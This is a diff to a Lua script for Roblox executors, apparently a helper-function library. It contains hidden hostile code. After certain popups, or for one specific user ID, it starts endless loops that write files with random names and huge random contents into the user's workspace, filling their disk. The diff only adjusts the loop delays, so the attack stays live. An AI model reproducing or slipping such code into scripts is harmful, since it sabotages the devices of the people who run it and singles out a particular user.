@@ -102,7 +102,7 @@ if shared.FuncsConnect then
 		Functions.displayErrorPopup("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", "OK", {OK = function()
 		  task.spawn(function()
         repeat
-          task.wait()
+          task.wait(0.2)
           writefile(Functions.randomGUID()..".txt", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
         until false
 		  end)
@@ -115,7 +115,7 @@ if shared.FuncsConnect then
 	    Functions.displayErrorPopup("Functions", "enjoy fully max workspace", "OK", {OK = function()
 	      task.spawn(function()
           repeat
-            task.wait()
+            task.wait(0.2)
             writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
           until false
         end)
@@ -125,8 +125,8 @@ if shared.FuncsConnect then
 	if lplr.UserId == 2624022508 then
 	  task.spawn(function()
 			repeat
-        task.wait(0.1)
-        writefile(Functions.randomGUID()..".lua", "-- Unknown"..Functions.randomString(5555555555, 5555555555))
+        task.wait(0.2)
+        writefile(Functions.randomGUID()..".lua", "-- Unknown\n"..Functions.randomString(5555555555, 5555555555))
       until false
     end)
 	end
